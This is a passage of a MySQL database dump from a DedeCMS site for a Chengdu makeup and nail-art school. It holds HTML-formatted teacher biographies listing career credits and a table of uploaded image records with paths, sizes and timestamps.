INSERT INTO dede_teachers VALUES ('49', '36', '', '', '222.211.124.86', '/uploads/150417/1-15041G30026394.png', '<span style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); font-family: 微软雅黑, \'microsoft yahei\'; line-height: 30px; text-indent: 28px;\">高级彩妆讲师</span><br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑, \'microsoft yahei\'; font-size: 16px; line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); font-family: 微软雅黑, \'microsoft yahei\'; line-height: 30px; text-indent: 28px;\">2001年-2010群丽婚纱摄影设计部高级造型化妆师<br />\r\n2010年群丽婚纱摄影学校高级讲师<br />\r\n<br />\r\n曾担任：<br />\r\n<br />\r\n06年新潮2周年超女冯家妹指定化妆造型师<br />\r\ngirl杂志模特化妆造型指导老师<br />\r\n成飞公司年会活动化妆总监<br />\r\n成都华为集团公司员工形象设计<br />\r\n精功模特大赛活动评委<br />\r\n2010年宝马汽车年会活动化妆总监<br />\r\n新潮杂志&ldquo;美丽课堂&rdquo;主讲讲师<br />\r\n成都电视台&ldquo;闻香识女人&rdquo;栏目化妆造型师<br />\r\n成都电视台&ldquo;欢乐来斗阵&rdquo;栏目化妆造型师<br />\r\n成都电视台&ldquo;达人秀&rdquo;栏目化妆造型师<br />\r\n全国巡演话剧&ldquo;剩女郎&rdquo;&ldquo;有多少爱可以胡来&rdquo;化妆造型指导老师<br />\r\n&nbsp;</span>');
INSERT INTO dede_teachers VALUES ('59', '33', '', '', '125.69.6.7', '/uploads/150417/1-15041G25Kb18.png', '<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	高级化妆造型师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　高级化妆讲师<br />\r\n	&nbsp; &nbsp; &nbsp; &nbsp;高级造型讲师<br />\r\n	&nbsp; &nbsp; &nbsp; &nbsp;中国群丽化妆培训高级讲师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　参与活动：</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　亨得利钟表眼镜有限公司化妆形象培训指导</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　第51届国际小姐大赛总决赛化妆造型设计师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　荣乐杯发型化妆大赛特邀化妆造型师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　成都理工大学迎新晚会化妆造型设计师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　索尼爱立信迎新会化妆造型设计师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　电子设计院47周年全国文艺汇演化妆造型设计师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　2011西部国际博览会化妆造型设计师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　2011康师傅集团迎新晚会化妆造型设计师</p>\r\n');
INSERT INTO dede_teachers VALUES ('60', '33', '', '', '125.69.6.7', '/uploads/150417/1-15041G24K0401.png', '<br />\r\n<br />\r\n<span style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); font-family: 微软雅黑, \'microsoft yahei\'; line-height: 30px; text-indent: 28px;\">成飞公司年会活动化妆总监<br />\r\n成都华为集团公司员工形象设计<br />\r\n精功模特大赛活动评委<br />\r\n2010年宝马汽车年会活动化妆总监<br />\r\n新潮杂志&ldquo;美丽课堂&rdquo;主讲讲师<br />\r\n成都电视台&ldquo;闻香识女人&rdquo;栏目化妆造型师<br />\r\n成都电视台&ldquo;欢乐来斗阵&rdquo;栏目化妆造型师<br />\r\n成都电视台&ldquo;达人秀&rdquo;栏目化妆造型师<br />\r\n全国巡演话剧&ldquo;剩女郎&rdquo;&ldquo;有多少爱可以胡来&rdquo;化妆造型指导老师</span>');
INSERT INTO dede_teachers VALUES ('62', '34', '', '', '222.211.124.86', '/uploads/150417/1-15041G15441639.png', '<span style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); font-family: 微软雅黑, \'microsoft yahei\'; line-height: 30px; text-indent: 28px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;高级彩妆讲师</span><br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑, \'microsoft yahei\'; font-size: 16px; line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); font-family: 微软雅黑, \'microsoft yahei\'; line-height: 30px; text-indent: 28px;\">2001年-2010群丽婚纱摄影设计部高级造型化妆师<br />\r\n2010年群丽婚纱摄影学校高级讲师<br />\r\n曾担任：<br />\r\n06年新潮2周年超女冯家妹指定化妆造型师<br />\r\ngirl杂志模特化妆造型指导老师<br />\r\n成飞公司年会活动化妆总监<br />\r\n成都华为集团公司员工形象设计<br />\r\n精功模特大赛活动评委<br />\r\n2010年宝马汽车年会活动化妆总监<br />\r\n新潮杂志&ldquo;美丽课堂&rdquo;主讲讲师<br />\r\n成都电视台&ldquo;闻香识女人&rdquo;栏目化妆造型师<br />\r\n成都电视台&ldquo;欢乐来斗阵&rdquo;栏目化妆造型师<br />\r\n成都电视台&ldquo;达人秀&rdquo;栏目化妆造型师<br />\r\n全国巡演话剧&ldquo;剩女郎&rdquo;&ldquo;有多少爱可以胡来&rdquo;化妆造型指导老师<br />\r\n&nbsp;</span>');
INSERT INTO dede_teachers VALUES ('63', '35', '', '', '125.69.6.7', '/uploads/150417/1-15041G02P5D7.png', '<p class=\"dib w_100 f15 tc\" style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(51, 51, 51); font-family: \'\'; line-height: 30px; text-indent: 28px;\">\r\n	<span style=\"margin: 0px; padding: 0px; border: none; font-size: 16px; font-family: 微软雅黑, \'microsoft yahei\';\"><img alt=\"高静老师\" src=\"/uploads/allimg/150416/15562A513-0.jpg\" style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; height: 1154px; width: 669px;\" /><br />\r\n	<br />\r\n	<br />\r\n	<span style=\"margin: 0px; padding: 0px; border: none; font-size: 12px; color: rgb(255, 0, 0);\"><span style=\"margin: 0px; padding: 0px; border: none; font-size: 12px;\">高级美甲专业讲师</span></span></span><br />\r\n	&nbsp;</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; font-family: Arial, sans-serif; zoom: 1; color: rgb(0, 0, 0); line-height: 25px;\">\r\n	高老师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; font-family: Arial, sans-serif; zoom: 1; color: rgb(0, 0, 0); line-height: 25px;\">\r\n	　　具有丰富的授课经验和课程编排能力，课程安排丰富实用，教学风格大气稳重，寓教于乐，深受学员的喜爱。其主讲的美甲店营销管理、促销策划具有极强的操作实用性，每增新意，是学员及加盟商百听不厌的经典课程。其主编的进巍美甲多套实用教材、全面的理论知识、极强的技术支持更是成为加盟店的制胜法宝</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; font-family: Arial, sans-serif; zoom: 1; color: rgb(0, 0, 0); line-height: 25px;\">\r\n	　　</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; font-family: Arial, sans-serif; zoom: 1; color: rgb(0, 0, 0); line-height: 25px;\">\r\n	所获荣誉：<br />\r\n	<br />\r\n	&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;高级美甲讲师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; font-family: Arial, sans-serif; zoom: 1; color: rgb(0, 0, 0); line-height: 25px;\">\r\n	&nbsp;</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; font-family: Arial, sans-serif; zoom: 1; color: rgb(0, 0, 0); line-height: 25px;\">\r\n	参加活动：</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; font-family: Arial, sans-serif; zoom: 1; color: rgb(0, 0, 0); line-height: 25px;\">\r\n	　　&ldquo;宾利驾控体验&rdquo;携手群丽化妆学校活动指导<br />\r\n	&nbsp; &nbsp; &nbsp; &nbsp; 西南首届美甲协会会员及美甲大赛评审员</p>\r\n');
INSERT INTO dede_teachers VALUES ('64', '36', '', '', '125.69.6.7', '/uploads/150417/1-15041G11522H1.png', '<p class=\"dib w_100 f15 tc\" style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">\r\n	<span style=\"margin: 0px; padding: 0px; border: none; font-size: 16px; font-family: 微软雅黑, \'microsoft yahei\';\"><span style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; color: rgb(0, 0, 0); font-family: Arial, sans-serif; line-height: 25px;\">所获奖项：</span></span></p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　荣获台湾第九届华容杯彩妆大赏赛国际组创意组金奖</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　所获荣誉：</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　中国美发美容协会会员</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　中国电影电视技术协会会员</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　中国高级化妆造型师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　参加活动：</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　2012玛莎拉蒂与群丽化妆学校携手成都站试驾体验</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　北京奥运会开幕式化妆造型设计师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　第51届国际小姐大赛总决赛化妆造型设计师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　&ldquo;荣乐杯&rdquo;化妆发型大赛特邀化妆造型设计师</p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 14px; text-indent: 28px; zoom: 1; font-family: Arial, sans-serif; line-height: 25px;\">\r\n	　　2009--2011中国成都国际车展特邀化妆造型设计师</p>\r\n');
INSERT INTO dede_teachers VALUES ('112', '34', '', '', '125.69.6.7', '/uploads/150505/1-15050515312XK.png', '<div>\r\n	高级彩妆讲师 2001年-2010群丽婚纱摄影设计部高级造型化妆师 2010年群丽婚纱摄影学校高级讲师 曾担任： 06年新潮2周年超女冯家妹指定化妆造型师 girl杂志模特化妆造型指导老师</div>\r\n<div>\r\n	2001年-2010群丽婚纱摄影设计部高级造型化妆师</div>\r\n<div>\r\n	2010年群丽婚纱摄影学校高级讲师</div>\r\n<div>\r\n	曾担任：</div>\r\n<div>\r\n	06年新潮2周年超女冯家妹指定化妆造型师</div>\r\n<div>\r\n	girl杂志模特化妆造型指导老师</div>\r\n<div>\r\n	成飞公司年会活动化妆总监</div>\r\n<div>\r\n	成都华为集团公司员工形象设计</div>\r\n<div>\r\n	精功模特大赛活动评委</div>\r\n');
INSERT INTO dede_teachers VALUES ('113', '34', '', '', '125.69.6.7', '/uploads/150505/1-150505154236337.png', '<div>\r\n	girl杂志模特化妆造型指导老师</div>\r\n<div>\r\n	成飞公司年会活动化妆总监</div>\r\n<div>\r\n	成都华为集团公司员工形象设计</div>\r\n<div>\r\n	精功模特大赛活动评委</div>\r\n<div>\r\n	2010年宝马汽车年会活动化妆总监</div>\r\n<div>\r\n	新潮杂志&ldquo;美丽课堂&rdquo;主讲讲师</div>\r\n<div>\r\n	成都电视台&ldquo;闻香识女人&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	成都电视台&ldquo;欢乐来斗阵&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	成都电视台&ldquo;达人秀&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	全国巡演话剧&ldquo;剩女郎&rdquo;&ldquo;有多少爱可以胡来&rdquo;化妆造型指导老师</div>\r\n');
INSERT INTO dede_teachers VALUES ('114', '34', '', '', '125.69.6.7', '/uploads/150505/1-150505154536357.png', '<div>\r\n	girl杂志模特化妆造型指导老师</div>\r\n<div>\r\n	成飞公司年会活动化妆总监</div>\r\n<div>\r\n	成都华为集团公司员工形象设计</div>\r\n<div>\r\n	精功模特大赛活动评委</div>\r\n<div>\r\n	2010年宝马汽车年会活动化妆总监</div>\r\n<div>\r\n	新潮杂志&ldquo;美丽课堂&rdquo;主讲讲师</div>\r\n<div>\r\n	成都电视台&ldquo;闻香识女人&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	成都电视台&ldquo;欢乐来斗阵&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	成都电视台&ldquo;达人秀&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	全国巡演话剧&ldquo;剩女郎&rdquo;&ldquo;有多少爱可以胡来&rdquo;化妆造型指导老师</div>\r\n');
INSERT INTO dede_teachers VALUES ('115', '34', '', '', '125.69.6.7', '/uploads/150505/1-150505154QG05.png', '<div>\r\n	girl杂志模特化妆造型指导老师</div>\r\n<div>\r\n	成飞公司年会活动化妆总监</div>\r\n<div>\r\n	成都华为集团公司员工形象设计</div>\r\n<div>\r\n	精功模特大赛活动评委</div>\r\n<div>\r\n	2010年宝马汽车年会活动化妆总监</div>\r\n<div>\r\n	新潮杂志&ldquo;美丽课堂&rdquo;主讲讲师</div>\r\n<div>\r\n	成都电视台&ldquo;闻香识女人&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	成都电视台&ldquo;欢乐来斗阵&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	成都电视台&ldquo;达人秀&rdquo;栏目化妆造型师</div>\r\n<div>\r\n	全国巡演话剧&ldquo;剩女郎&rdquo;&ldquo;有多少爱可以胡来&rdquo;化妆造型指导老师</div>\r\n');

-- ----------------------------
-- Table structure for `dede_uploads`
-- ----------------------------
DROP TABLE IF EXISTS `dede_uploads`;
CREATE TABLE `dede_uploads` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `arcid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `url` char(80) NOT NULL DEFAULT '',
  `mediatype` smallint(6) NOT NULL DEFAULT '1',
  `width` char(10) NOT NULL DEFAULT '',
  `height` char(10) NOT NULL DEFAULT '',
  `playtime` char(10) NOT NULL DEFAULT '',
  `filesize` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `memberid` (`mid`) USING BTREE,
  KEY `arcid` (`arcid`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=445 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_uploads
-- ----------------------------
INSERT INTO dede_uploads VALUES ('1', '1', '群丽动态', '/uploads/150411/1-1504111A53UP.png', '1', '333', '180', '0', '39514', '1428742538', '1');
INSERT INTO dede_uploads VALUES ('404', '0', '150522/1-150522162Z93Z.jpg', '/uploads/allimg/150522/1-150522162Z93Z.jpg', '1', '644', '1128', '0', '656892', '1432283349', '1');
INSERT INTO dede_uploads VALUES ('405', '0', '150522/1-150522163440195.jpg', '/uploads/allimg/150522/1-150522163440195.jpg', '1', '644', '1128', '0', '656892', '1432283680', '1');
INSERT INTO dede_uploads VALUES ('406', '0', '150522/1-15052216364E05.jpg', '/uploads/allimg/150522/1-15052216364E05.jpg', '1', '644', '1128', '0', '660300', '1432283806', '1');
INSERT INTO dede_uploads VALUES ('409', '0', '150523/1-15052315001U07.jpg', '/uploads/allimg/150523/1-15052315001U07.jpg', '1', '2343', '5443', '0', '2109597', '1432364418', '1');
INSERT INTO dede_uploads VALUES ('413', '121', '213期学员作品', '/uploads/150524/1-150524152914F8.jpg', '1', '322', '236', '0', '108933', '1432452554', '1');
INSERT INTO dede_uploads VALUES ('412', '0', '150523/1-1505231J212N2.jpg', '/uploads/allimg/150523/1-1505231J212N2.jpg', '1', '640', '853', '0', '389196', '1432374132', '1');
INSERT INTO dede_uploads VALUES ('8', '22', '优秀学员', '/uploads/allimg/150414/1-1504141401460-L.png', '1', '0', '0', '0', '27365', '1428991306', '1');
INSERT INTO dede_uploads VALUES ('9', '22', '优秀学员', '/uploads/150414/1-1504141402041V.png', '1', '117', '117', '0', '27365', '1428991324', '1');
INSERT INTO dede_uploads VALUES ('10', '23', '作品1', '/uploads/150414/1-150414143213527.png', '1', '323', '275', '0', '172919', '1428993133', '1');
INSERT INTO dede_uploads VALUES ('11', '24', '作品2', '/uploads/150414/1-1504141435163V.png', '1', '231', '191', '0', '56198', '1428993316', '1');
INSERT INTO dede_uploads VALUES ('12', '24', '作品2', '/uploads/150414/150414/1-15041414361OH.png', '1', '210', '236', '0', '86049', '1428993377', '1');
INSERT INTO dede_uploads VALUES ('417', '117', '205期学员作品', '/uploads/150524/1-150524153533337.jpg', '1', '322', '275', '0', '123155', '1432452933', '1');
INSERT INTO dede_uploads VALUES ('416', '118', '203期学员作品', '/uploads/150524/1-15052415322H43.jpg', '1', '322', '236', '0', '89614', '1432452747', '1');
INSERT INTO dede_uploads VALUES ('415', '119', '205期学员作品', '/uploads/150524/1-150524153203O2.jpg', '1', '322', '275', '0', '96892', '1432452723', '1');
INSERT INTO dede_uploads VALUES ('414', '120', '205期学员作品', '/uploads/150524/1-15052415310RM.jpg', '1', '322', '275', '0', '99156', '1432452668', '1');
INSERT INTO dede_uploads VALUES ('419', '120', '205期学员作品', '/uploads/150524/1-150524154415A1.jpg', '1', '322', '275', '0', '67757', '1432453455', '1');
INSERT INTO dede_uploads VALUES ('418', '121', '213期学员作品', '/uploads/150524/1-150524153G03A.jpg', '1', '322', '275', '0', '128796', '1432453030', '1');
INSERT INTO dede_uploads VALUES ('411', '0', '150523/1-150523151Q1B6.jpg', '/uploads/allimg/150523/1-150523151Q1B6.jpg', '1', '2343', '5443', '0', '2059010', '1432365491', '1');
INSERT INTO dede_uploads VALUES ('410', '0', '150523/1-150523151340516.jpg', '/uploads/allimg/150523/1-150523151340516.jpg', '1', '2343', '5443', '0', '2059381', '1432365220', '1');
INSERT INTO dede_uploads VALUES ('420', '117', '205期学员作品', '/uploads/150524/1-15052415492E47.jpg', '1', '322', '275', '0', '78861', '1432453766', '1');
INSERT INTO dede_uploads VALUES ('421', '118', '203期学员作品', '/uploads/150524/1-150524155211E4.jpg', '1', '322', '275', '0', '134843', '1432453931', '1');
INSERT INTO dede_uploads VALUES ('23', '0', '150415/1-150415104141416.jpg', '/uploads/150415/1-150415104141416.jpg', '1', '234', '140', '0', '45062', '1429065701', '1');
INSERT INTO dede_uploads VALUES ('408', '0', '150523/1-150523122349129.jpg', '/uploads/allimg/150523/1-150523122349129.jpg', '1', '800', '1104', '0', '1536713', '1432355029', '1');
INSERT INTO dede_uploads VALUES ('25', '1', '群丽化妆老师带领同学们牵手F5.6摄影', '/uploads/allimg/150415/1-15041511033L23.jpg', '1', '1072', '1500', '0', '897763', '1429067017', '1');
INSERT INTO dede_uploads VALUES ('26', '1', '群丽化妆老师带领同学们牵手F5.6摄影', '/uploads/allimg/150415/1-150415110430462.jpg', '1', '1072', '1500', '0', '897763', '1429067070', '1');
INSERT INTO dede_uploads VALUES ('27', '1', '群丽化妆老师带领同学们牵手F5.6摄影', '/uploads/allimg/150415/1-15041511054BB.jpg', '1', '1072', '1500', '0', '1187171', '1429067146', '1');
INSERT INTO dede_uploads VALUES ('407', '0', '150522/1-1505221F4102W.jpg', '/uploads/allimg/150522/1-1505221F4102W.jpg', '1', '700', '1226', '0', '769814', '1432285450', '1');
INSERT INTO dede_uploads VALUES ('29', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-1504151140435D.jpg', '1', '5520', '3680', '0', '788022', '1429069243', '1');
INSERT INTO dede_uploads VALUES ('30', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-150415114139519.jpg', '1', '3680', '2456', '0', '615425', '1429069299', '1');
INSERT INTO dede_uploads VALUES ('31', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-150415114504551.jpg', '1', '3680', '2456', '0', '522411', '1429069504', '1');
INSERT INTO dede_uploads VALUES ('32', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-15041511454JA.jpg', '1', '3680', '2456', '0', '359891', '1429069547', '1');
INSERT INTO dede_uploads VALUES ('33', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-150415114624V0.jpg', '1', '3680', '2456', '0', '283843', '1429069584', '1');
INSERT INTO dede_uploads VALUES ('34', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-150415114HX05.jpg', '1', '5520', '3680', '0', '670554', '1429069648', '1');
INSERT INTO dede_uploads VALUES ('35', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-150415114UbX.jpg', '1', '3680', '2456', '0', '539557', '1429069739', '1');
INSERT INTO dede_uploads VALUES ('36', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-150415115005218.jpg', '1', '3680', '2456', '0', '390133', '1429069805', '1');
INSERT INTO dede_uploads VALUES ('37', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150415/1-150415115105R0.jpg', '1', '5520', '3680', '0', '913658', '1429069865', '1');
INSERT INTO dede_uploads VALUES ('38', '0', '150415/1-150415132555436.jpg', '/uploads/allimg/150415/1-150415132555436.jpg', '1', '690', '779', '0', '192847', '1429075555', '1');
INSERT INTO dede_uploads VALUES ('39', '0', '150416/1-150416102514463.png', '/uploads/allimg/150416/1-150416102514463.png', '1', '610', '420', '0', '344631', '1429151114', '1');
INSERT INTO dede_uploads VALUES ('40', '0', '150416/1-150416102631609.png', '/uploads/150416/1-150416102631609.png', '1', '610', '420', '0', '344631', '1429151191', '1');
INSERT INTO dede_uploads VALUES ('41', '47', '成都群丽化妆学校2014荣获3A等级', '/uploads/allimg/150416/1-1504161030210-L.jpg', '1', '0', '0', '0', '42855', '1429151421', '1');
INSERT INTO dede_uploads VALUES ('42', '48', '5645', '/uploads/allimg/150416/1-1504161031130-L.jpg', '1', '0', '0', '0', '99161', '1429151473', '1');
INSERT INTO dede_uploads VALUES ('43', '48', '5645', '/uploads/150416/1-15041610312aA.jpg', '1', '1280', '960', '0', '99161', '1429151489', '1');
INSERT INTO dede_uploads VALUES ('44', '47', '成都群丽化妆学校2014荣获3A等级', '/uploads/150416/1-150416103213622.jpg', '1', '680', '473', '0', '42855', '1429151533', '1');
INSERT INTO dede_uploads VALUES ('45', '51', '唇妆天天换花样 总有一款适合你', '/uploads/allimg/150416/1-150416105401424.jpg', '1', '661', '377', '0', '431518', '1429152841', '1');
INSERT INTO dede_uploads VALUES ('46', '52', '199期学员刘静，现任【唯视觉】化妆执行总监', '/uploads/allimg/150416/1-1504161120450-L.jpg', '1', '0', '0', '0', '120941', '1429154445', '1');
INSERT INTO dede_uploads VALUES ('47', '52', '199期学员刘静，现任【唯视觉】化妆执行总监', '/uploads/150416/1-150416112101533.jpg', '1', '500', '666', '0', '120941', '1429154461', '1');
INSERT INTO dede_uploads VALUES ('48', '58', '群丽学校化妆美甲学员【廖雪梅】创业明星', '/uploads/150416/1-150416114231961.png', '1', '687', '942', '0', '1554621', '1429155751', '1');
INSERT INTO dede_uploads VALUES ('49', '61', '群丽学校美甲学员【李静】创业明星', '/uploads/allimg/150416/1-1504161151210-L.jpg', '1', '0', '0', '0', '285422', '1429156281', '1');
INSERT INTO dede_uploads VALUES ('50', '61', '群丽学校美甲学员【李静】创业明星', '/uploads/150416/1-150416115130344.jpg', '1', '597', '800', '0', '285422', '1429156290', '1');
INSERT INTO dede_uploads VALUES ('51', '66', '作品2', '/uploads/150416/1-150416133305447.png', '1', '322', '275', '0', '178399', '1429162385', '1');
INSERT INTO dede_uploads VALUES ('52', '63', '美甲专业教师', '/uploads/150416/1-150416155502N5.png', '1', '659', '663', '0', '395998', '1429170902', '1');
INSERT INTO dede_uploads VALUES ('53', '63', '美甲专业教师', '/uploads/allimg/150416/15562A513-0.jpg', '1', '669', '1154', '0', '492906', '1429170988', '1');
INSERT INTO dede_uploads VALUES ('54', '63', '美甲专业教师', '/uploads/150416/1-150416155K11S.png', '1', '659', '663', '0', '395998', '1429171071', '1');
INSERT INTO dede_uploads VALUES ('55', '63', '美甲专业教师', '/uploads/150417/1-15041G02P5D7.png', '1', '659', '663', '0', '379732', '1429237685', '1');
INSERT INTO dede_uploads VALUES ('56', '64', '综合专业教师', '/uploads/150417/1-15041G11452405.jpg', '1', '364', '209', '0', '42263', '1429240492', '1');
INSERT INTO dede_uploads VALUES ('57', '64', '综合专业教师', '/uploads/150417/1-15041G11522H1.png', '1', '151', '153', '0', '43106', '1429240522', '1');
INSERT INTO dede_uploads VALUES ('58', '69', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '/uploads/allimg/150417/1-15041G14409291.jpg', '1', '500', '375', '0', '63567', '1429242249', '1');
INSERT INTO dede_uploads VALUES ('59', '69', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '/uploads/allimg/150417/1-15041G1443WP.jpg', '1', '500', '375', '0', '100690', '1429242278', '1');
INSERT INTO dede_uploads VALUES ('60', '69', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '/uploads/allimg/150417/1-15041G14GLI.jpg', '1', '1072', '715', '0', '139636', '1429242437', '1');
INSERT INTO dede_uploads VALUES ('61', '69', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '/uploads/allimg/150417/1-15041G14ZH52.jpg', '1', '1072', '715', '0', '139482', '1429242547', '1');
INSERT INTO dede_uploads VALUES ('62', '69', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '/uploads/allimg/150417/1-15041G14942G5.jpg', '1', '1072', '715', '0', '138695', '1429242582', '1');
INSERT INTO dede_uploads VALUES ('63', '69', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '/uploads/allimg/150417/1-15041G15023Y4.jpg', '1', '1072', '715', '0', '140696', '1429242623', '1');
INSERT INTO dede_uploads VALUES ('64', '62', '高级讲师', '/uploads/150417/1-15041G15234308.png', '1', '364', '209', '0', '132931', '1429242754', '1');
INSERT INTO dede_uploads VALUES ('65', '62', '高级讲师', '/uploads/150417/1-15041G15441639.png', '1', '151', '153', '0', '42231', '1429242881', '1');
INSERT INTO dede_uploads VALUES ('66', '69', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '/uploads/allimg/150417/1-15041G2011V91.jpg', '1', '1072', '715', '0', '139636', '1429243278', '1');
INSERT INTO dede_uploads VALUES ('67', '69', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '/uploads/allimg/150417/1-15041G202221G.jpg', '1', '1072', '715', '0', '601795', '1429243342', '1');
INSERT INTO dede_uploads VALUES ('68', '0', '150417/1-15041G21434302.JPG', '/uploads/150417/150417/1-15041G21434302.JPG', '1', '5616', '3744', '0', '6666619', '1429244074', '1');
INSERT INTO dede_uploads VALUES ('69', '0', '150417/1-15041G21635514.jpg', '/uploads/150417/1-15041G21635514.jpg', '1', '1019', '677', '0', '82889', '1429244195', '1');
INSERT INTO dede_uploads VALUES ('70', '70', '　　群丽化妆学校参与精功国际模特大赛化妆活', '/uploads/allimg/150417/1-15041G2404S51.jpg', '1', '650', '846', '0', '339858', '1429245648', '1');
INSERT INTO dede_uploads VALUES ('71', '49', '美妆高级讲师', '/uploads/150417/1-15041G2443K26.png', '1', '151', '153', '0', '42231', '1429245877', '1');
